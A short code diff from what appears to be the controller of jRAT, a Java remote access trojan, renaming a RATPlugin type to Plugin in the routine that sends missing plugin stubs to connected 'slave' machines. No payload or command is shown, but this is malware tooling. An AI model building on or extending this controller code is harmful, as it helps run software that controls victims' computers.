@@ -8,7 +8,7 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-import jrat.api.RATPlugin;
+import jrat.api.Plugin;
 import se.jrat.controller.Globals;
 import se.jrat.controller.Main;
 import se.jrat.controller.OfflineSlave;
@@ -41,7 +41,7 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 		List<String> notInstalled = new ArrayList<String>();
 
 		if (plugins != null && Settings.getGlobal().getBoolean("plugintransfer")) {
-			for (RATPlugin plugin : Plugins.getPlugins()) {
+			for (Plugin plugin : Plugins.getPlugins()) {
 				if (!plugins.contains(plugin.getName())) {
 					notInstalled.add(plugin.getName());
 					Main.debug("Plugin " + plugin.getName() + " is not installed, adding to list");
@@ -51,7 +51,7 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 			Map<String, File> filesToTransfer = new HashMap<String, File>();
 
 			for (String sp : notInstalled) {
-				RATPlugin plugin = Plugins.getPlugin(sp);
+				Plugin plugin = Plugins.getPlugin(sp);
 				File[] files = Globals.getPluginStubDirectory().listFiles();
 
 				for (File stubFile : files) {
